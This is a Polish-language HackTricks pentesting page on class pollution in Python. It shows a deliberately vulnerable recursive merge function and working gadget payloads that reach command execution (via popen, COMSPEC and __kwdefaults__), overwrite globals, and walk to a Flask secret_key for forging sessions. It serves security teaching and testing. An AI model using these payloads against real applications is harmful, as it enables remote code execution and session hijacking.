# Zanieczyszczenie klas (Prototype Pollution w Pythonie)

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przykład

Zmiana `__qualname__` za pośrednictwem odwołania do klasy instancji aktualizuje klasę oraz jej modyfikowalne klasy bazowe.<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Podstawowy przykład podatności

Rekurencyjne scalanie może akceptować kontrolowane przez atakującego klucze mapowania i zapisywać zagnieżdżone wartości za pomocą dostępu elementowego lub atrybutowego.<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Przykłady gadgetów

<details>

<summary>Utworzenie domyślnej wartości właściwości klasy prowadzącej do RCE (subprocess)</summary>

Wspólna klasa bazowa może dostarczyć domyślny atrybut wykorzystywany przez gadget poleceń klasy siostrzanej.<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Zanieczyszczanie innych klas i zmiennych globalnych przez <code>globals</code></summary>

Mapowanie `__globals__` funkcji udostępnia przestrzeń nazw modułu dostępną z metody zdefiniowanej w tym module.<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Dowolne wykonywanie podprocesów</summary>

W systemie Windows `Popen(..., shell=True)` używa zmiennej środowiskowej `COMSPEC` jako domyślnej powłoki, dlatego ten gadżet demonstruje przekierowanie poleceń oparte na zmiennych środowiskowych.<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Nadpisywanie <strong><code>__kwdefaults__</code></strong></summary>

Python opisuje `__kwdefaults__` jako mapowanie wartości domyślnych dla parametrów dostępnych wyłącznie jako argumenty nazwane, które następują po `*` lub `*args` w definicji funkcji.<sup>[[4]](#references)</sup> Poniższy gadget nadpisuje to mapowanie za pośrednictwem skażonej ścieżki funkcji.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Nadpisywanie sekretu Flask między plikami</summary>

Jeśli klasa polluted object znajduje się w module innym niż moduł entry-point aplikacji, metody tego obiektu początkowo udostępniają w `__globals__` przestrzeń nazw modułu klasy. Następnie przejście przez loader oraz `sys.modules.__main__` może doprowadzić do modułu entry-point i jego obiektu Flask `app`.<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask używa `app.secret_key` do podpisywania session cookie; znajomość tego klucza pozwala atakującemu tworzyć prawidłowe dane sesji.<sup>[[6]](#references)</sup>

Oryginalny writeup przedstawia następującą ścieżkę prowadzącą do `app.secret_key`; CTFtime również hostuje kopię writeupu.<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Changing key może umożliwić podpisywanie zastępczych session cookies i może prowadzić do privilege escalation; zobacz [stronę z narzędziami do obsługi sesji Flask](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Sprawdź również poniższą stronę, aby znaleźć więcej gadżetów tylko do odczytu:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution w Pythonie](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022 task manager writeup (oryginalny)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
- [4] [inspect — Inspekcja obiektów na żywo](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Zarządzanie procesami podrzędnymi](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Dokumentacja Flask](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
